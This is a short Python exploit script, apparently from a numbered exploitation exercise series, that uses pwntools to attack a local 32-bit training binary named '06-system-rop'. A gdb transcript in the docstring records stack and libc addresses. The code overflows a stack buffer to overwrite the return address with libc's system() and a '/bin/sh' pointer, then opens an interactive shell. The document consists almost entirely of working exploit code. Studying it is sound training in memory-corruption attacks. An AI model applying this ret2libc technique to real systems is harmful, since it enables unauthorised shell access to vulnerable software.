#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x80484b6: file src/06-system-rop.c, line 5.
(gdb) c
Continuing.
Reading /lib/i386-linux-gnu/libc.so.6 from remote target...
Reading /lib/i386-linux-gnu/libc-2.27.so from remote target...
Reading /lib/i386-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/06-system-rop.c:5
5	int vulnerable() {
(gdb) i r $esp
esp            0xffffcf8c	0xffffcf8c
(gdb) p &buffer[0]
$1 = 0xffffcf00 ""
(gdb) info proc mappings
process 14115
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
...
	0xf7dd1000 0xf7fa6000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa6000 0xf7fa7000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa7000 0xf7fa9000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa9000 0xf7faa000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
...
"""

import struct
import sys

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './bin/x86/06-system-rop'
libc_path = '/lib/i386-linux-gnu/libc-2.27.so'

vulnerable_ret_addr = 0xffffcf8c
buffer_addr = 0xffffcf00
libc_addr = 0xf7dd1000

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p32(system_addr)
payload += p32(0) # fake return address from system
payload += p32(bin_sh_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
